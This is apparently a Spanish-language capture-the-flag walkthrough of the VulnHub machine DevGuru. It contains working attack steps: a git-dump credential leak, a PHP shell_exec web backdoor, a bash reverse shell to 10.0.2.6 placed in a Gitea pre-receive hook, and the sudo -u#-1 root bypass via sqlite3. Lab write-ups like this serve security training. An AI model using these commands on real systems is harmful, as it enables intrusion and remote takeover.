
**Nombre de la maquina**
	Empire: DevGuru
**Dirección de enlace**
	https://www.vulnhub.com/entry/devguru-1,620/
**Modo de Red**
	NAT
**Virtualizado**
	VirtualBox

### Recopilación de Información

Al tener en cuenta que la maquina se encuentra en el mismo segmento de red, procedemos a usar el comando **[[Recursos#**netdiscover**|netdiscover]]**.

	netdiscover -r 10.0.2.0/24

![[Pasted image 20240405091719.png]]

Una vez obtenemos un escaneo de la red local, y obtenemos la IP de cada uno de los dispositivos en la red local, debemos a proceder a identificar cual es la maquina que vamos a atacar.

Para poder identificar cual es la maquina objetivo, procedimos a realizar un escaneo con la herramienta **[[Recursos#nmap|nmap]]** en cada una de las IP usando el siguiente comando.

	sudo nmap -A -p- 10.0.2.8

![[Pasted image 20240405092948.png]]

Al realizar el escaneo determinamos que la IP **10.0.2.4** pertenece a la maquina objetivo.

> [!INFO] Servicios ejecutados en los puertos
> 20 =  Detectamos que se esta ejecutando un **OpenSSH 7.6p1**
> 
> 80 = Detectamos que se esta ejecutando un **Apache httpd 2.4.29**
> 
>  `Adicionalmente nmap nos reconoció que existe un *http-git* y en dado caso que no logremos llegarle a una maquina podemos aprovechar esa direccion y hostearlo para llegarle.`

### Enumeración de Directorios

> [!TIP] GIT
> En esta ocasión ocupamos Git Tool ya que según los resultados de nmap, esta web esta alojada en GIT.

Basándonos en el http-git, lo aprovecharemos para poder extraer datos de GIT haciendo uso de la herramienta [Git Tool](https://github.com/internetwache/GitTools).

![[Pasted image 20240405094747.png]]

Creamos una carpeta para esta herramienta, y la descargamos con el siguiente comando.

	git clone https://github.com/internetwache/GitTools.git

Estas herramientas nos sirven para poder extraer todos los repositorios que se encuentran dentro de la maquina vulnerable.

![[Pasted image 20240405095125.png]]


> [!NOTE] GitTools
> **Dumper** = Nos sirve para poder extraer los directorios que se encuentran dentro del Git
> 
> **Extractor** = Nos sirve para poder extraer aquellos directorios que están incompletos

Ya que lo que nos interesa es extraer todos los directorios dentro de Git, ocuparemos el Dumper, así que entramos a la carpeta, ejecutamos el script y asignamos el host victima.

	./gitdumper.sh http://10.0.2.8/.git/ website/

![[Pasted image 20240405100153.png]]

> Hacemos uso del **./** para inicializar el script
> Especificamos el hosts
> finalizamos con **/.git/** para indicarle el tipo de archivo que necesitamos
> Y finalizamos con el nombre del archivo en donde se guardaran los resultados **website/**

Como podemos observar, dentro de los resultados arrojados en la herramienta, notamos que hay descargas que no se llevaron a cabo, y eso es debido a que pueden ser directorios incompletos o rotos, por lo cual haremos uso de la otra herramienta con el siguiente comando.

	./extractor.sh ../Dumper/website ./website

![[Pasted image 20240405100559.png]]

Y con ello ya tenemos el directorio website con toda la información recolectada.

![[Pasted image 20240405101812.png]]

Como podemos notar dentro del contenido que recolectamos en website, existen archivos PHP, por lo cual deducimos que la pagina web se esta corriendo con este lenguaje, así que vamos a la web.

![[Pasted image 20240405102104.png]]

Ahora que validamos lo anteriormente mencionado, y sabemos que datos necesitamos, nos dirigimos a la carpeta para poder buscar mas información.

![[Pasted image 20240405110313.png]]

### Explotación

Notamos un **database.php** muy sospechoso, así que veamos que contiene.

![[Pasted image 20240405110434.png]]

En esta ocasión, únicamente nos interesa los datos de **MySQL** ya que según vimos en la web, el sistemas esta en MySQL. Y con estos datos nos dirigimos a la web.

![[Pasted image 20240405110648.png]]

Hemos entrado **adminer.php**.

![[Pasted image 20240405110753.png]]

Ahora que tenemos acceso a la BD comenzamos a navegar en ella, hasta encontrar algo que nos ayude.

![[Pasted image 20240405111724.png]]

Navegando por la pagina, dimos con los datos de un usuario. Si notamos bien, lo que es la contraseña se encuentra cifrada, así que lo primero de todo es identificar el tipo de cifrado que tiene implementado. 

Para ello ocuparemos una técnico "efectiva" para determinar el tipo de cifrado, y es copiar las primeras 4 letras y usar un motor de búsqueda para identificarlo.

![[Pasted image 20240407174744.png]]

En este ejercicio tenemos acceso a la base de datos, y básicamente también los permisos para cambiar la contraseña, así que haremos uso de la herramienta **[devglan](https://www.devglan.com/online-tools/aes-encryption-decryption)**.

Ocuparemos Bcrypt Hashing, ya que según el motor de búsqueda este fue el que mayor coincidencia tuvo.

![[Pasted image 20240407175201.png]]

![[Pasted image 20240407180046.png]]

> [!NOTE] Bcrypt Hashing
> En esta ocasión hicimos uso de otros generadores de Hash, ya que el usado en el ejemplo no funciono. [link](https://bcrypt-generator.com/)

Una vez tenemos el hash generado, vamos a la base de datos y cambiamos la contraseña.

![[Pasted image 20240407180305.png]]

Ahora, ya que hemos cambiado la contraseña, lo único que nos queda es buscar un login para ingresar esos datos. Para ellos nos apoyaremos de la información recolectada de los directorios arriba, y comenzamos a buscar.

![[Pasted image 20240407180532.png]]

Una vez encontramos en login, ingresamos las credenciales, y Listo!!!!.

![[Pasted image 20240407180815.png]]


Ahora naveguemos en la pagina para ver que encontramos.

![[Pasted image 20240407181630.png]]

Lo que haremos, será dejar pre cargado en el home, un RCE, para que cada vez que ingresemos a Home, esta se inicialice, apoyándonos del siguiente comando.

	function onStart()
	{
		$this->page["myVar"] = shell_exec($_GET['cmd']);
	}

![[Pasted image 20240407184806.png]]

Ahora hay que indicarle que al ejecutar la URL (home) este ejecute RCE con el siguiente comando.

	
	{{this.page.myVar}}

![[Pasted image 20240407184919.png]]

> [!FAILURE] Comando integrados
> Tener en cuenta que acá, influye bastante las reglas de espacios a la hora de escribir en ciertos lenguajes. En los ejemplo anteriores podemos ver que no se ocupan casi espacios, pues eso evito que se ejecutara correctamente el RCE, así que dejad espacios.
> 
> Como nota adicional, puedes apoyarte de siguiente GitHub para las [RCE](https://github.com/Alexisdevpro/Reverse-Shell-Cheat-Sheet)

Ejecutamos la vista previa.

![[Pasted image 20240407184948.png]]

Obtenemos un mensaje de error. Pero no importa, ya que nuestro objetivo no es crear una web, asi que nos dirigimos a la URL y colocamos.

	10.0.2.8/?cmd=[command]

![[Pasted image 20240407235904.png]]

Ahora, para poder acceder a todos esos archivos, vamos a necesitar crear una Reverse Shell(que ya tenemos creada).

![[Pasted image 20240408002720.png]]

> [!TIP] Uso de Reverse Shell
> Nuestra mision principal ahora es subir ese codigo, y para ello levantaremos un servidor en python, pero como preferencia es recomendable hacerlo todo y tener todos los archivos en el escrito **Vacio**.

Ahora levantamos un servidor con Python.

	sudo python3 -m http.server 80

![[Pasted image 20240408002943.png]]

Ahora debemos extraer el archivo que necesitamos desde la web usando el siguiente comando.

	wget%2010.0.2.6/shell.php

![[Pasted image 20240408003559.png]]

Verificamos.

![[Pasted image 20240408003731.png]]

Y listo!!! Ahora solo nos queda levantar el [[Recursos#nc|Netcap]]

![[Pasted image 20240408003934.png]]

Y ejecutamos la Shell!!!

![[Pasted image 20240408004014.png]]

### Post - Explotación/Escalado de Privilegios.

Ahora, lo que haremos será mejorar la interacción que terminal de un sistema remoto, apoyándonos del siguiente comando.

	python3 -c 'import pty; pty.spawn("/bin/bash")'

![[Pasted image 20240408005256.png]]

> [!TIP] A donde ir?
> En esta ocacion nuestra prioridad es ir a por el contenido del directorio /var, ya que aca es donde se guardan las configuración que afectan al servidor que esta ejecutando.

Nos dirigimos al directorios **/var** y vemos su contenido

![[Pasted image 20240408005736.png]]

Por lo que podemos observar, el archivo **app.ini.bak** es el único archivo que no requiere privilegios de root, así que vamos a chequearlo

![[Pasted image 20240408005952.png]]

![[Pasted image 20240408011523.png]]

Navegando a través de ella, nos encontramos con estas credenciales.

![[Pasted image 20240408010430.png]]

Probémosla.

![[Pasted image 20240408010818.png]]

y listo, hemos accedido a través del usuario **gitea**. Una vez hemos accedido, comenzamos a buscar cualquier indicio de información que sea relevante.

En esta ocasión encontramos en los registro un usuario.

![[Pasted image 20240408232504.png]]

Ahora, modificaremos la password de ese usuario.

![[Pasted image 20240408234512.png]]


> [!TIP] passwd_hash
> En algunas bases de datos como MySQL es necesario especificar el tipo de encriptacion que se esta ocupando, en nuestro caso es **bcrypt** asi que lo especificamos.

Ahora, algo muy importante. Recuerdas los datos que encontramos dentro del archivo **app.ini.bak**. En esa ocacion encontramos los datos del host del server, a lo cual procederemos a ocupar en esta ocacion para consolidar si este nuevo acceso pertenece al mismo, asi que vamos a hostearlo apoyandonos del siguiente comando.

	sudo nano /etc/hosts

![[Pasted image 20240408234906.png]]

Y probamos si funciona.

![[Pasted image 20240408234945.png]]

Nos dirigimos al apartado de Login, e ingresamos las credenciales.

![[Pasted image 20240408235039.png]]

Y listo. Ahora, nos queda revisar la pagina, y justamente de frente tenemos commits que se han realizado y a la derecha el un repositorio, vamos a revisarlo.

![[Pasted image 20240408235552.png]]

Ahora ya nos encontramos un paso mas cerca de poder vulnerar la maquina por completo.

Aprovechándonos del repositorio que encontramos, lo que haremos será, inyectar una Reverse Shell en el repositorio con el objetivo de, al ejecutarse, este sea cargado por el servidor y podamos iniciar sesión con el mismo usuario. Para ellos nos dirigimos a: **Settings > Git Hooks** y seleccionamos **pre-receive** y cargamos el siguiente código.

	/bin/bash -i >& /dev/tcp/10.0.2.6/1234 0>&1

![[Pasted image 20240409004017.png]]

Y le damos en **Update Hook**. Ahora para que este ejecute los cambios, debemos realizar un cambio directamente en el repositorio, asi que nos vamos a ello. En esta ocacion afectaremos el archivo **README.md**.

![[Pasted image 20240409004220.png]]


> [!TIP] Motivos
> Basandonos en aspectos de la realidad, modificar directamente los archivos de un repositorio puede traer errores o cambios notorios en la web, asi que es mejor realizar cambios en el readme, ya que no afecta directamente.

Ahora, solo nos queda levantar el [[Recursos#nc|netcat]] para poder guardar los cambios.

![[Pasted image 20240409004438.png]]

Ahora si, guardamos los cambios realizados en el archivo y hacemos **Commit Changes**.

![[Pasted image 20240409004843.png]]

Y listo!!!, estamos dentro de la maquina. Ahora solo nos queda escalar privilegios.

Lo primero que haremos será ver que tipo de permisos poseemos, para ello ejecutamos el comando

	sudo -l

![[Pasted image 20240409005001.png]]

Observamos que este trabaja con sqlite3, así que es hora de explotarlo. Para esta ocasión ocuparemos una de las recomendaciones de marcadores de Kali Linux, y es [Exploit-DB](https://www.exploit-db.com/)

Usamos el buscador con las palabras **sudo**.

![[Pasted image 20240409010042.png]]

Como podemos observar, tenemos diferentes métodos de escalación, así que probemos con **[sudo 1.8.27 - Security Bypass]([sudo 1.8.27 - Security Bypass](https://www.exploit-db.com/exploits/47502))**

![[Pasted image 20240409010419.png]]

> [!TIP] Ejecución del Exploit
> Como podemos recordar mas arriba, para poder ejecutar comando en sudo, necesitamos hacerlo a través de Sqlite3.

Colocamos el siguiente comando.

	sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'

![[Pasted image 20240409012013.png]]

> [!INFO] Comando
> **sudo** = Este comando de manera general, nos ayuda a nosotros a obtener una shell del sistema como super usuario.
> 
> **-u#-1** = Se ocupo para indicar el tipo de usuario que necesitamos, en este caso super usuario
> sqlite3 = Lo ocupamos para conectarnos a la base de datos.
> 
> **/dev/null** = Al esta apuntando un directorio **/null** creamos un directorio vacío, y ya que estamos usando sqlite3 significa que estamos creando una base de datos vacía.
> 
> **.shell/bin/bash** = Este comando se uso para crear la shell en el sistema

Ahora nos vamos a

	cd ../../../../ && cd root/ && ls && cat msg.txt

![[Pasted image 20240409012143.png]]

Listo!!
















